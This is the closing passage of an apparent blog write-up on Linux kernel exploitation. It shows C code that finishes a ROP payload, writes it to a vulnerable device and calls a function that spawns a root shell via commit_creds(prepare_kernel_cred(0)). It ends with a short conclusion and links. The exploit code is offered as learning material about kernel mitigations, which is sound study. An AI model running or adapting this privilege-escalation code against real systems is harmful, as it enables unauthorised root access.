</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>unsigned long</span><span>)priv_esc</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_cs</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_rflags</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_sp</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_ss</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[+] Writing payload for root"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>payload</span><span style=color:#bfbab0cc>,</span><span style=color:#ff7733>sizeof</span><span>(payload))</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>Finally, after executing <code>commit_creds(prepare_kernel_cred(0))</code>, we call our <code>pric_esc</code> function which gives us our sweet root shell.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>priv_esc</span><span>(){
</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#ffb454>getuid</span><span>()</span><span style=color:#f29668>==</span><span style=color:#f29718>0</span><span>){
</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[+] Root!!!!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>system</span><span>(</span><span style=color:#c2d94c>"/bin/sh"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>else</span><span>{
</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[-] Something wrong"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>exit</span><span>(INVALID)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>}
</span></code></pre><h1 id=conclusion>Conclusion</h1><p>I had a great time learning about all the mitigations by enabling them one by one to understand them better.<p>Full Script- <a href=https://gist.github.com/PwnVerse/717604fae0f1fcbc4afa6e9878860dce>Here</a><h2 id=references>References</h2><ul><li><a href=https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/>An Awesome Blog post</a></ul></section></article></main></div>